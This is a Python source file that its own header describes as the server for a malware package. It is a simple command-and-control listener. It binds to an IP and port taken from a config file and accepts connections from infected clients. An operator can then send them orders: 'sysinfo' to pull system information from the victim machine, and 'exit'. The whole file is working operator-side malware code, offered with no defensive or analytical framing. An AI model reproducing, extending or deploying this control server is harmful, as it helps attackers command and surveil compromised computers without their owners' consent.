# a server for the malware package
import json
import os
import socket
import time

import pyfiglet


class Server:
    def __init__(self):
        """
        read data from config.json file and create a socket object to receive the connection from the malware
        """
        self.socket = None
        curr_dir_par = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        with open(os.path.join(curr_dir_par, 'data', 'config.json')) as f:
            json_data = json.load(f)
            # read IP, port from it
            self.ip = json_data['IP']
            self.port = json_data['Port']

    def start(self):
        """
        start the server
        :return: None
        """

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        host = socket.gethostname() if self.ip == 'localhost' else self.ip
        self.socket.bind((host, self.port))
        self.socket.listen(5)

    @staticmethod
    def __get_message(client_socket):
        """
        get the message from the client
        :param client_socket: the socket object of the client
        :return: the message from the client
        """
        return client_socket.recv(2048).decode('utf-8')

    @staticmethod
    def __send_message(msg, client_socket):
        """
        send the message to the client
        :param msg: the message to send
        :param client_socket: the socket object of the client
        :return: None
        """
        client_socket.send(msg.encode('utf-8'))

    def run(self):
        """
        run the server
        :return: None
        """
        while True:
            print('Waiting for a connection...')
            client_socket, addr = self.socket.accept()
            self.__handle_client(client_socket, addr)

    def __handle_client(self, client_socket, addr):
        """
        handle the client connection
        :param client_socket: the socket object of the client
        :param addr: the address of the client
        :return: None
        """
        print("Got a connection from %s" % str(addr))
        while True:
            input_msg = input('Enter an order:\t')
            if input_msg == 'exit':
                self.__send_message(input_msg, client_socket)
                while True:
                    if self.__get_message(client_socket) == 'exiting...':
                        self.__send_message('Thank you for connecting', client_socket)
                        break
                break
            if input_msg == 'sysinfo':
                self.__send_message(input_msg, client_socket)
                msg = self.__get_message(client_socket)
                print(msg)
            else:
                print('Invalid order')
            time.sleep(3)

    def close(self):
        """
        close the server
        :return: None
        """
        self.socket.close()

    def __del__(self):
        """
        close the server
        :return: None
        """
        self.close()


if __name__ == '__main__':
    print(pyfiglet.figlet_format('Server'))
    server = Server()
    server.start()
    server.run()
